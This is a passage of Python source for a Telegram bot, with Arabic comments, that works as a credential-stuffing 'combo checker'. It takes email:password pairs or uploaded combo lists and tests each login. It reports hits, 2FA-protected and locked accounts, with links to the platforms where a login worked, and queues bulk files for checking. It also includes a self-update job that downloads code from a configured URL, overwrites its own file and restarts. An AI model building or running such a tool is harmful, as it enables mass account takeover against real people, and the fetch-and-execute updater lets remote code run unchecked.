        button_kwargs['text'] = f"{fallback_emoji} {text}"
    else:
        button_kwargs['text'] = text
    button_kwargs.update(kwargs)
    button_kwargs.pop('style', None)
    try:
        return InlineKeyboardButton(**button_kwargs)
    except Exception:
        safe_kwargs = {k: v for k, v in button_kwargs.items() if k not in ['style', 'icon_custom_emoji_id']}
        if fallback_emoji:
            safe_kwargs['text'] = f"{fallback_emoji} {text}"
        else:
            safe_kwargs['text'] = text
        return InlineKeyboardButton(**safe_kwargs)

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        await update.message.reply_text(t(user_id, "banned"), parse_mode=constants.ParseMode.HTML)
        return
    if BOT_CLOSED and user_id not in OWNER_IDS:
        await update.message.reply_text(t(user_id, "maintenance"), parse_mode=constants.ParseMode.HTML)
        return
    if get_user_lang(user_id) == "en" and not is_user_subscribed(user_id):
        await update.message.reply_text(t(user_id, "subscribe_required"), parse_mode=constants.ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "channel_button"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}"),
                                                InlineKeyboardButton(t(user_id, "confirm_button"), callback_data="confirm_subscribe")]]))
        return

    session = user_sessions.get(user_id)
    text = update.message.text.strip()
    # إذا كان المستخدم يرسل أمر (مثل /start) أثناء فحص، ما نعالجها هنا
    if text.startswith('/'):
        return
    if not session or not session.waiting_for:
        if ':' not in text:
            await update.message.reply_text(t(user_id, "wrong_format"), parse_mode=constants.ParseMode.HTML)
            return
        parts = text.split(':', 1)
        email, password = parts[0].strip(), parts[1].strip()
        if not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", email):
            await update.message.reply_text(t(user_id, "invalid_email"), parse_mode=constants.ParseMode.HTML)
            return

        wait_msg = await update.message.reply_text(t(user_id, "checking"), parse_mode=constants.ParseMode.HTML)
        loop = asyncio.get_running_loop()
        try:
            result = await asyncio.wait_for(loop.run_in_executor(None, check_single_account, email, password), timeout=SINGLE_TIMEOUT)
        except asyncio.TimeoutError:
            result = {'status': 'TIMEOUT', 'platforms': []}
        await wait_msg.delete()

        if result['status'] == 'HIT':
            platforms = result.get('platforms', [])
            platforms_links = format_platforms_links(email, platforms) if platforms else t(user_id, "no_platforms")
            txt = t(user_id, "hit_single", email, password, platforms_links)
            keyboard = InlineKeyboardMarkup([
                [make_button(t(user_id, "main_menu"), "6206505206197261313", callback_data="main_menu"),
                 make_button(t(user_id, "check_another"), "5321514030781713133", callback_data="check_another")]
            ])
            await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML, reply_markup=keyboard)
        elif result['status'] == '2FA':
            txt = t(user_id, "2fa", email, password)
            await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)
        elif result['status'] == 'LOCKED':
            await update.message.reply_text(t(user_id, "locked"), parse_mode=constants.ParseMode.HTML)
        elif result['status'] == 'BAD':
            await update.message.reply_text(t(user_id, "bad"), parse_mode=constants.ParseMode.HTML)
        elif result['status'] == 'TIMEOUT':
            await update.message.reply_text(t(user_id, "timeout"), parse_mode=constants.ParseMode.HTML)
        else:
            await update.message.reply_text(t(user_id, "error"), parse_mode=constants.ParseMode.HTML)
        return

    if session.waiting_for == 'full_single_input':
        if ':' not in text:
            await update.message.reply_text(t(user_id, "wrong_format"), parse_mode=constants.ParseMode.HTML)
            return
        parts = text.split(':', 1)
        email, password = parts[0].strip(), parts[1].strip()
        if not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", email):
            await update.message.reply_text(t(user_id, "invalid_email"), parse_mode=constants.ParseMode.HTML)
            return

        wait_msg = await update.message.reply_text(t(user_id, "checking"), parse_mode=constants.ParseMode.HTML)
        loop = asyncio.get_running_loop()
        try:
            result = await asyncio.wait_for(loop.run_in_executor(None, check_single_account, email, password), timeout=SINGLE_TIMEOUT)
        except asyncio.TimeoutError:
            result = {'status': 'TIMEOUT', 'platforms': []}
        await wait_msg.delete()

        if result['status'] == 'HIT':
            platforms = result.get('platforms', [])
            platforms_links = format_platforms_links(email, platforms) if platforms else t(user_id, "no_platforms")
            txt = t(user_id, "hit_single", email, password, platforms_links)
            keyboard = InlineKeyboardMarkup([
                [make_button(t(user_id, "main_menu"), "6206505206197261313", callback_data="main_menu"),
                 make_button(t(user_id, "check_another"), "5321514030781713133", callback_data="check_another")]
            ])
            await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML, reply_markup=keyboard)
        elif result['status'] == '2FA':
            txt = t(user_id, "2fa", email, password)
            await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)
        elif result['status'] == 'LOCKED':
            await update.message.reply_text(t(user_id, "locked"), parse_mode=constants.ParseMode.HTML)
        elif result['status'] == 'BAD':
            await update.message.reply_text(t(user_id, "bad"), parse_mode=constants.ParseMode.HTML)
        elif result['status'] == 'TIMEOUT':
            await update.message.reply_text(t(user_id, "timeout"), parse_mode=constants.ParseMode.HTML)
        else:
            await update.message.reply_text(t(user_id, "error"), parse_mode=constants.ParseMode.HTML)

        session.waiting_for = None
        if user_id in user_sessions:
            del user_sessions[user_id]

# ═══════════════════ معالج رفع الملفات ═══════════════════
async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.message.chat.id
    
    if is_user_banned(user_id):
        await update.message.reply_text(t(user_id, "banned"), parse_mode=constants.ParseMode.HTML)
        return
    if BOT_CLOSED and user_id not in OWNER_IDS:
        await update.message.reply_text(t(user_id, "maintenance"), parse_mode=constants.ParseMode.HTML)
        return
    if get_user_lang(user_id) == "en" and not is_user_subscribed(user_id):
        await update.message.reply_text(t(user_id, "subscribe_required"), parse_mode=constants.ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "channel_button"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}"),
                                                InlineKeyboardButton(t(user_id, "confirm_button"), callback_data="confirm_subscribe")]]))
        return

    document = update.message.document
    session = user_sessions.get(user_id)
    
    # إذا كان لدى المستخدم فحص ملف نشط (يفحص حالياً) - نرفض الملف الجديد
    if session and session.is_running and session.mode == 'full_file':
        await update.message.reply_text(t(user_id, "check_active"), parse_mode=constants.ParseMode.HTML)
        return
    
    if not document.file_name or not document.file_name.endswith(".txt") or (document.file_size and document.file_size > 10*1024*1024):
        await update.message.reply_text(t(user_id, "file_invalid"), parse_mode=constants.ParseMode.HTML)
        return

    try:
        file = await context.bot.get_file(document.file_id)
        content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
    except:
        await update.message.reply_text(t(user_id, "file_fail"), parse_mode=constants.ParseMode.HTML)
        return

    lines = [l.strip() for l in content.splitlines() if l.strip()]
    if not lines:
        await update.message.reply_text(t(user_id, "file_empty"), parse_mode=constants.ParseMode.HTML)
        return

    valid = [l for l in lines if re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+:[^:\s]+$", l)]
    if not valid:
        await update.message.reply_text(t(user_id, "file_bad_format"), parse_mode=constants.ParseMode.HTML)
        return

    session = user_sessions.get(user_id)
    if session:
        session.waiting_for = None

    # نحدد الحالة: هل يوجد مستخدم يفحص ملف حالياً؟
    global currently_checking_file
    
    with file_queue_lock:
        is_anyone_checking = currently_checking_file is not None
    
    if not is_anyone_checking:
        # لا أحد يفحص - نبدأ فوراً
        currently_checking_file = user_id
        
        # حذف جلسة قديمة إن وجدت
        if user_id in user_sessions:
            del user_sessions[user_id]
        
        session = CheckerSession(user_id)
        session.mode = 'full_file'
        session.waiting_for = None
        user_sessions[user_id] = session
        
        # أولاً: إرسال رسالة التنظيف
        cleaning_text = f"<b><blockquote>{E_CLEAN} {t(user_id, 'cleaning_file')}</blockquote></b>"
        cleaning_msg_id = None
        try:
            cleaning_msg = await update.message.reply_text(cleaning_text, parse_mode=constants.ParseMode.HTML)
            cleaning_msg_id = cleaning_msg.message_id
            await asyncio.sleep(2)
        except Exception as e:
            print(f"[File Handler] Error with cleaning message for user {user_id}: {e}")
        
        if cleaning_msg_id:
            try:
                await update.message.chat.delete_message(message_id=cleaning_msg_id)
            except Exception as e:
                print(f"[File Handler] Error deleting cleaning message for user {user_id}: {e}")
        
        # ثالثاً: إرسال رسالة الفحص (التقدم)
        text = format_live_message(session)
        buttons = [[{"text": t(user_id, "cancel_check"), "callback_data": f"cancel_check_{user_id}", "style": "danger", "icon_custom_emoji_id": "5870734657384877785"}]]
        try:
            result = await send_colored_buttons(user_id, text, buttons)
            if result and result.get('ok'):
                session.progress_msg_id = result.get('result', {}).get('message_id')
            else:
                msg = await update.message.reply_text(text, parse_mode=constants.ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "cancel_check"), callback_data=f"cancel_check_{user_id}")]]))
                session.progress_msg_id = msg.message_id
        except Exception as e:
            print(f"[File Handler] Error sending progress for user {user_id}: {e}")
            try:
                msg = await update.message.reply_text(text, parse_mode=constants.ParseMode.HTML)
                session.progress_msg_id = msg.message_id
            except:
                pass
        session.last_progress_text = ""
        
        # بدء الفحص
        await run_combo_checker(session, valid, context.bot, user_id, session.progress_msg_id)
    else:
        # يوجد مستخدم يفحص - ندخل المستخدم في الطابور
        # إرسال رسالة الانتظار
        wait_text = t(user_id, "file_queue_wait")
        try:
            wait_msg = await update.message.reply_text(wait_text, parse_mode=constants.ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "cancel_check"), callback_data=f"cancel_check_{user_id}")]]))
            waiting_msg_id = wait_msg.message_id
        except Exception as e:
            print(f"[File Handler] Error sending wait message for user {user_id}: {e}")
            waiting_msg_id = None
        
        # إضافة المستخدم للطابور
        with file_queue_lock:
            # نتأكد أن المستخدم ليس موجود مسبقاً في الطابور
            already_in_queue = any(entry["user_id"] == user_id for entry in file_queue)
            if not already_in_queue:
                file_queue.append({
                    "user_id": user_id,
                    "lines": valid,
                    "chat_id": chat_id,
                    "waiting_msg_id": waiting_msg_id
                })
        
        # تحديث الجلسة
        if user_id not in user_sessions or not user_sessions[user_id]:
            session = CheckerSession(user_id)
            session.mode = 'full_file'
            session.waiting_for = None
            session.progress_msg_id = None
            user_sessions[user_id] = session

# ═══════════════════ وظيفة التحديث التلقائي ═══════════════════
async def check_for_updates(context: ContextTypes.DEFAULT_TYPE = None):
    if not UPDATE_URL:
        return
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(UPDATE_URL)
            if response.status_code == 200:
                new_code = response.text
                with open(__file__, "r", encoding="utf-8") as f:
                    current_code = f.read()
                if new_code != current_code:
                    with open(__file__, "w", encoding="utf-8") as f:
                        f.write(new_code)
                    print("🔄 تم اكتشاف تحديث جديد، جاري إعادة التشغيل...")
                    os.execv(sys.executable, ['python3'] + sys.argv)
    except Exception as e:
        print(f"⚠️ خطأ في التحديث التلقائي: {e}")

# ═══════════════════ التشغيل ═══════════════════
def main():
    load_users_data()
    save_thread = Thread(target=periodic_save_background, daemon=True)
    save_thread.start()
    
    app = Application.builder().token(BOT_TOKEN).connect_timeout(60.0).read_timeout(60.0).pool_timeout(30.0).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("info", info_command))
    app.add_handler(CommandHandler("con", con_command))
    app.add_handler(CommandHandler("top", top_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("un_ban", unban_command))
    app.add_handler(CommandHandler("con_of", con_off_command))
    app.add_handler(CommandHandler("con_on", con_on_command))
    app.add_handler(CommandHandler("sent_all", sent_all_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    
    # إضافة مهمة التحديث التلقائي كل ساعة
    if UPDATE_URL:
        app.job_queue.run_repeating(check_for_updates, interval=3600)
    
    print("✅ البوت يعمل بسرعة عالية مع طابور فحص ملفات ذكي...")
    try:
        app.run_polling(drop_pending_updates=True)
    except Exception as e:
        print(f"❌ انقطع الاتصال: {e}")
        raise e

if __name__ == "__main__":
    Path("Results").mkdir(exist_ok=True)
    Path("Accounts").mkdir(exist_ok=True)
    
    while True:
        try:
            main()
        except Exception as e:
            print(f"🔄 إعادة تشغيل البوت بسبب خطأ: {e}")
            time.sleep(5)
